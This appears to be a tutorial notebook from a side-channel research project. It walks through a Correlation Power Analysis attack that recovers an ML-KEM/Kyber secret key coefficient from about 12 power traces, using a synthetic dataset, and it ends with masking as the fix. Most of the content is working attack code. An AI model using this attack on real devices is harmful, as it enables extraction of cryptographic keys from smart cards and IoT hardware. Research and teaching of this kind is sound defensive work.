# Breaking ML-KEM with 12 power traces

## A guided tour of Correlation Power Analysis (CPA) on Kyber

*Part of the [Mewtwo project](https://github.com/seb30123/Mewtwo) — reproducible side-channel attacks on post-quantum cryptography.*

---

**What this notebook does**: in 10 short cells, we recover a secret key coefficient of ML-KEM (the new NIST post-quantum encryption standard) from a tiny number of power-consumption measurements.

**Original attack**: Nkotto, *Template and CPA Side Channel Attacks on the Kyber/ML-KEM Pair-Pointwise Multiplication*, IACR ePrint 2025/1577.

**Original dataset**: Rezaeezade et al., Zenodo [10.5281/zenodo.15352482](https://doi.org/10.5281/zenodo.15352482), CC-BY-4.0.

**This notebook** uses a small synthetic dataset (~50 KB) that mimics the structure of the real one, so the entire attack runs in 30 seconds without any download. The same code, with the same logic, recovers the real Kyber key from the real dataset in ~10 seconds.

## 1. The analogy (for non-cryptographers)

Imagine a magical safe that bakes cookies. You give it a recipe (the *ciphertext*), it mixes in a secret ingredient stored inside (the *key*), and out comes a cookie.

The safe is mathematically perfect: you cannot guess the secret ingredient just by tasting the cookie. **But while it bakes, the fridge inside makes noise**. And the noise depends on how big the ingredient is.

So you run an experiment: give the safe **12 different recipes**, record the fridge noise 12 times, and compare these noises to all possible values of the secret ingredient. The value that best explains the noises you heard **is** the secret.

**Translation to ML-KEM**:

| In the analogy | In the real attack |
|---|---|
| Magic safe baking cookies | A microcontroller running ML-KEM |
| Secret ingredient inside | Secret coefficient `a[0]` of the key |
| The recipe you give | Ciphertext value `b[1]` (public) |
| Cookie that comes out | `fqmul(a[0], b[1])` (internal, not seen) |
| Fridge noise | Power consumption (measured with a scope) |
| 12 experiments | 12 decapsulations |
| Test all possible values | Test all 6 657 possible `a[0]` |
| Value that explains the noise | Hypothesis with highest correlation |

## 2. Setup

Kyber/ML-KEM uses modular arithmetic over the prime **q = 3329**. The internal multiplication is *Montgomery multiplication* with the constant `QINV = -3327`. We need both.

In [ ]:
import numpy as np
import scipy.io
from pathlib import Path
import matplotlib.pyplot as plt

# Kyber/ML-KEM parameters (FIPS 203)
KYBER_Q = 3329          # prime modulus
KYBER_QINV = -3327      # q^-1 mod 2^16 for Montgomery multiplication

print(f'Kyber q     = {KYBER_Q}')
print(f'Kyber QINV  = {KYBER_QINV}')
print(f'NumPy {np.__version__}, SciPy ok')

## 3. Load the dataset

We load a tiny synthetic dataset (100 traces × 500 power samples). The structure mirrors the real Rezaeezade dataset:

- `tracesA99.mat`: a (100, 500) matrix of power measurements
- `noncesA99.mat`: a (100, 12) matrix where each row holds the   secret key `a[0]`, the ciphertext `b[1]`, and the multiplication   result, all as 16-bit little-endian byte pairs

*To run this notebook, first execute `python tests/generate_synthetic_dataset.py` from the repo root.*

In [ ]:
# Locate the synthetic dataset (created by tests/generate_synthetic_dataset.py)
ROOT = Path.cwd()
while ROOT.name and not (ROOT / 'tests' / 'synthetic_dataset').exists():
    if ROOT.parent == ROOT:
        raise FileNotFoundError('Run tests/generate_synthetic_dataset.py first')
    ROOT = ROOT.parent
DATA = ROOT / 'tests' / 'synthetic_dataset'

traces = scipy.io.loadmat(str(DATA / 'tracesA99.mat'), squeeze_me=True)['tracesA'].astype(np.float64)
vals = scipy.io.loadmat(str(DATA / 'noncesA99.mat'), squeeze_me=True)['noncesA'].astype(np.int32)

# Reconstruct 16-bit values from byte pairs (little-endian)
a0_truth = int(((vals[:, 0] | (vals[:, 1] << 8)).astype(np.int16))[0])
b1 = (vals[:, 2] | (vals[:, 3] << 8)).astype(np.int16)

print(f'Loaded {traces.shape[0]} traces of {traces.shape[1]} samples each')
print(f'Ground truth (what CPA must recover): a[0] = {a0_truth}')
print(f'Ciphertext b[1] examples: {b1[:5]}')

## 4. What does a power trace look like?

Each measurement is 500 samples of voltage (here in arbitrary units). The full operation lasts about 200 ms in real captures. **The data leak hides at one specific sample** — the moment when the microcontroller writes the multiplication result to memory.

In [ ]:
fig, ax = plt.subplots(figsize=(11, 4))
for i in range(3):
    ax.plot(traces[i], alpha=0.7, label=f'trace {i}')
ax.set_xlabel('Sample index')
ax.set_ylabel('Power (a.u.)')
ax.set_title('Three example power traces')
ax.legend()
ax.grid(alpha=0.3)
plt.tight_layout()
plt.show()

print(f'Power range : {traces.min():.0f} to {traces.max():.0f}')
print(f'Looks like noise? It is — except at one specific sample.')

## 5. The function we are attacking: `fqmul`

Inside ML-KEM, the bottleneck operation is **Montgomery multiplication** of two 16-bit signed integers modulo q. The C reference implementation (PQClean) looks like this:

```c
int16_t fqmul(int16_t a, int16_t b) {
    int32_t product = (int32_t)a * (int32_t)b;
    int16_t u = (int16_t)(product * QINV);
    int32_t t = (int32_t)u * KYBER_Q;
    return (int16_t)((product - t) >> 16);
}
```

Here is the NumPy-vectorized version (does 100 multiplications in parallel):

In [ ]:
def fqmul_vec(a, b):
    """Montgomery multiplication, vectorized for NumPy arrays."""
    a32 = a.astype(np.int32)
    b32 = b.astype(np.int32)
    product = a32 * b32
    u = ((product * KYBER_QINV) & 0xFFFF).astype(np.int16).astype(np.int32)
    return ((product - u * KYBER_Q) >> 16).astype(np.int16)

# Quick sanity: does it give the value we know from the real dataset?
test_a = np.array([558], dtype=np.int16)
test_b = np.array([1385], dtype=np.int16)
result = fqmul_vec(test_a, test_b)[0]
print(f'fqmul(558, 1385) = {result}  (expected 1613 from the real dataset)')
assert int(result) == 1613, 'fqmul does not match Kyber reference!'
print('OK — implementation matches the Kyber spec.')

## 6. The CPA attack itself

For each of the 6 657 possible values of `a[0]`:
1. Predict what `fqmul(hypothesis, b[1])` would be (one value per trace)
2. Compute the **Hamming weight** of each prediction (number of bits    set to 1 in the 16-bit value)
3. Compute the **Pearson correlation** between the predicted    Hamming weights and the actual power measurements
4. Keep the maximum |correlation| across all 500 time samples

**The correct hypothesis maximizes the correlation.** The bigger the Hamming weight, the more transistors switch, the more power is consumed (or in our case, the more it deviates from baseline).

In [ ]:
def hw16(x):
    """Hamming weight of 16-bit values, vectorized."""
    x = x.astype(np.uint16)
    h = np.zeros_like(x, dtype=np.int32)
    for i in range(16):
        h += (x >> i) & 1
    return h

def correlate(predictions, traces):
    """Pearson correlation between predictions (N,) and each
    column of traces (N, T). Vectorized for speed."""
    p = predictions.astype(np.float64)
    pc = p - p.mean()
    pn = np.linalg.norm(pc)
    if pn == 0:
        return np.zeros(traces.shape[1])
    tc = traces - traces.mean(axis=0)
    num = pc @ tc
    tn = np.sqrt((tc ** 2).sum(axis=0))
    den = pn * tn
    den[den == 0] = 1
    return num / den

# Run CPA on all 6657 hypotheses
import time
hypotheses = np.arange(-KYBER_Q + 1, KYBER_Q)
max_corrs = np.zeros(len(hypotheses))

t0 = time.time()
for i, k in enumerate(hypotheses):
    predicted_out = fqmul_vec(np.full_like(b1, k), b1)
    hw_pred = hw16(predicted_out)
    corr = correlate(hw_pred, traces)
    max_corrs[i] = np.abs(corr).max()
elapsed = time.time() - t0

best_k = int(hypotheses[max_corrs.argmax()])
best_corr = max_corrs.max()

print(f'CPA ran {len(hypotheses)} hypotheses in {elapsed:.1f}s')
print(f'Best guess  : a[0] = {best_k}  (correlation = {best_corr:.4f})')
print(f'Ground truth: a[0] = {a0_truth}')

# Check whether the recovered value matches (modulo q, since Montgomery has 4 aliases)
k_red = best_k % KYBER_Q
t_red = a0_truth % KYBER_Q
if k_red == t_red or k_red == (-a0_truth) % KYBER_Q:
    print('SUCCESS - recovered the secret coefficient.')
else:
    print('FAIL - recovered a different value.')

## 7. Visualizing the correlation peak

Let's plot the correlation for each of the 6 657 hypotheses. The true key creates **one (or up to four) very tall spike**; everything else stays close to zero. The four 'spikes' come from Montgomery aliasing: `+k`, `-k`, `+k - q`, `-k + q` all encode the same Kyber secret after reduction mod q.

In [ ]:
fig, ax = plt.subplots(figsize=(12, 5))
ax.plot(hypotheses, max_corrs, linewidth=0.7, color='#1a3a5c')
ax.axvline(a0_truth, color='green', linestyle='--', alpha=0.6,
           label=f'Ground truth a[0]={a0_truth}')
ax.axvline(-a0_truth, color='green', linestyle=':', alpha=0.4,
           label='Sign alias')
ax.set_xlabel('Hypothesis value for a[0]')
ax.set_ylabel('Max |correlation| across all samples')
ax.set_title('CPA: correlation peak at the true secret coefficient')
ax.legend()
ax.grid(alpha=0.3)
plt.tight_layout()
plt.show()

# Show the top 5 hypotheses
top5 = np.argsort(max_corrs)[::-1][:5]
print('Top 5 hypotheses:')
for rank, idx in enumerate(top5, 1):
    is_truth = '<-- truth' if hypotheses[idx] == a0_truth else ''
    print(f'  #{rank}  a[0]={hypotheses[idx]:+5d}  corr={max_corrs[idx]:.4f}  {is_truth}')

## 8. How few traces do we really need?

Above we used all 100 traces. Let's see what happens with fewer. On the real Rezaeezade dataset the answer is **12 traces are enough** for 100% reliable recovery — three orders of magnitude fewer than the 10 000 reported in the original Nkotto paper.

In [ ]:
# Restrict CPA to a window around the leakage POI for speed.
# In a real attack you find this POI by first correlating with the known
# intermediate (see N1 in our scripts). Here we know it's at sample 200.
POI = 200
WIN = 50

def is_kyber_equiv(k1, k2, q=KYBER_Q):
    """Two values are the same Kyber coefficient (sign + mod q)."""
    k1r = k1 % q
    k2r = k2 % q
    return k1r == k2r or k1r == (-k2) % q

def cpa_with_n(traces_in, b1_in, n, repeats=5, seed=42):
    """Run CPA with n traces over a POI window, return success rate."""
    rng = np.random.default_rng(seed)
    successes = 0
    for _ in range(repeats):
        idx = rng.choice(len(traces_in), size=n, replace=False)
        t_sub = traces_in[idx, POI-WIN:POI+WIN]  # window of 100 samples
        b_sub = b1_in[idx]
        max_c = np.zeros(len(hypotheses))
        for i, k in enumerate(hypotheses):
            pred = fqmul_vec(np.full_like(b_sub, k), b_sub)
            c = correlate(hw16(pred), t_sub)
            max_c[i] = np.abs(c).max()
        best = int(hypotheses[max_c.argmax()])
        if is_kyber_equiv(best, a0_truth):
            successes += 1
    return successes / repeats * 100

# Test fewer N values to keep total time under 1 minute
n_values = [5, 8, 12, 20, 50]
rates = []
import time
t0 = time.time()
for n in n_values:
    r = cpa_with_n(traces, b1, n)
    rates.append(r)
    print(f'N={n:3d}  ->  success rate = {r:.0f}%')
print(f'Total: {time.time()-t0:.1f}s')

fig, ax = plt.subplots(figsize=(10, 5))
ax.plot(n_values, rates, 'o-', color='#1a3a5c', linewidth=2, markersize=10)
ax.axhline(100, color='green', linestyle=':', alpha=0.5, label='100% recovery')
ax.set_xlabel('Number of power traces')
ax.set_ylabel('Key recovery success rate (%)')
ax.set_title('CPA convergence: how many traces do we need?')
ax.legend()
ax.grid(alpha=0.3)
ax.set_ylim(-5, 105)
plt.tight_layout()
plt.show()

## 9. What this means

We just demonstrated that **an unprotected ML-KEM implementation leaks its secret key through power consumption** with overwhelming signal strength. On the real Rezaeezade dataset, only **12 traces** suffice for full coefficient recovery.

### Operational implications

This attack requires **physical or near-physical access** to the device computing ML-KEM. Relevant scenarios:

- Smart cards (banking, identity, transit, SIM)
- Mid-range HSMs without SCA hardening
- IoT devices (medical, automotive V2X, industrial)
- RFID/NFC tokens

It does **NOT** apply to:

- TLS servers (no physical channel)
- Modern smartphones (massive noise, vectorized impls)
- Already-masked production implementations

### The fix

**Algorithmic masking** breaks this attack. Instead of storing the secret directly, split it into two random shares `a₁`, `a₂` such that `a = a₁ ⊕ a₂`. Operate on each share separately. The leakage observed by the attacker is now uncorrelated with the real secret.

Production deployments of ML-KEM on physically-accessible devices **must** use masked implementations. The PQClean reference implementation used in this notebook is explicitly labeled as **not for production deployment**.

### To go further

- **Full repository**: [github.com/seb30123/Mewtwo](https://github.com/seb30123/Mewtwo)
- **Original attack paper**: [Nkotto, ePrint 2025/1577](https://eprint.iacr.org/2025/1577)
- **Original dataset**: [Rezaeezade et al., Zenodo](https://doi.org/10.5281/zenodo.15352482) (3.4 GB, CC-BY-4.0)
- **Run on the real dataset**: download from Zenodo, then `python src/03_cpa_n2_full.py`
- **Other attacks in the Mewtwo catalog**: KyberSlash, Clangover, Cache-timing HQC, Ravi PC oracle, Hertzbleed — all with negative results documenting the robustness of modern AArch64 platforms.

---

*This notebook is part of the [Mewtwo project](https://github.com/seb30123/Mewtwo). Licensed MIT (code) / CC-BY-4.0 (docs). Educational and defensive research purposes only.*